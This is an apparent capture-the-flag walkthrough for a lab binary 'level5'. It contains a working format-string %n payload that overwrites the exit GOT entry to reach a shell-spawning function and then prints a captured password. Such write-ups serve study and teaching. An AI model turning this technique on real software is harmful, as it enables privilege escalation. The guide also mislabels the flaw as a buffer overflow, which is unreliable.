# `level5` Exploit

## Description

This guide explains how to exploit a buffer overflow vulnerability in the `level5` program to trigger the execution of a function that launches a shell.

## Prerequisites

- Access to the `level5` executable.
- Tools: GDB, Python.

## Exploitation Steps

### 1. Decompile the Binary

Use Ghidra or a similar tool to decompile the `level5` binary and understand its functionality.

### 2. Check Available Functions

- The `n` function contains a vulnerable `printf` call because it doesn't use format specifiers.
- An `exit(1)` call is made just after the `printf` call.
- There is an `o` function in the program but never called, with the following code:

```c
void o(void)
{
  system("/bin/sh");
  _exit(1);
}
```

This function launches a shell, which is our key to access the flag.

### Strategy

Our strategy is to overwrite the call to the `exit` function with a call to the `o` function to get a shell with the privileges needed to read `/home/user/level6/.pass`.

### 3. Find Function Addresses

Use GDB to find the addresses of the functions:

```bash
gdb level5
info function
0x080484a4  o
0x080484c2  n
0x08048504  main
```

- The address of the `o` function is `0x080484a4`, which is `\xa4\x84\x04\x08` in little-endian format.

To find the address of `exit`, use the following GDB command:

```bash
disas exit
```

You should see something like:

```gdb
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>: jmp *0x8049838
   0x080483d6 <+6>: push $0x28
   0x080483db <+11>: jmp 0x8048370
End of assembler dump.
```

- The address of `exit` is `0x08049838`, which is `\x38\x98\x04\x08` in little-endian format. We will overwrite this address with the address of the `o` function.

### 4. Exploit the Buffer Overflow Vulnerability

#### Step 1: Determine the Offset

Determine at which position `printf` starts to write the given string. Use this input string:

```bash
./level5
AAAA%08x.%08x.%08x.%08x.%08x.%08x
```

The output will be similar to:

```
AAAA00000200.f7ee5580.00000000.41414141.78383025.3830252e
```

- The value `41414141` (corresponding to `AAAA` in ASCII) appears. We find that the `printf` argument position is at the 4th position.

#### Step 2: Create the Exploit

The address of the `o` function in decimal is `134513828`. We need to subtract the 4 bytes of the destination address written at the beginning of the string: `134513828 - 4 = 134513824`.

The exploit string will be formatted like this: `<destination address> + %<decimal value>d + %4$n`

```bash
python -c 'print("\x38\x98\x04\x08%134513824d%4$n")'
```

#### Step 3: Execute the Exploit

Execute the exploit while keeping `stdin` open:

```bash
(python -c 'print("\x38\x98\x04\x08%134513824d%4$n")' ; cat) | ./level5
```

Once the shell is open, execute the commands:

```bash
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

### Explanation

1. **Buffer Overflow Vulnerability**: `printf` without format specifiers allows unintended memory reads and writes.
2. **%n Specifier**: Used to write the number of characters printed so far to an address specified on the stack.
3. **Offset Calculation**: Determines where the format string parameters are on the stack to correctly position the address of `o`.
4. **Exploit String**: Crafted to write the address of `o` in place of the address of `exit`.

## Conclusion

By following these steps, you have successfully exploited a buffer overflow vulnerability to gain shell access on `level5`. This technique uses knowledge of format string exploits and stack manipulation.

---

This README guides you through all the necessary steps to reproduce and understand the exploit.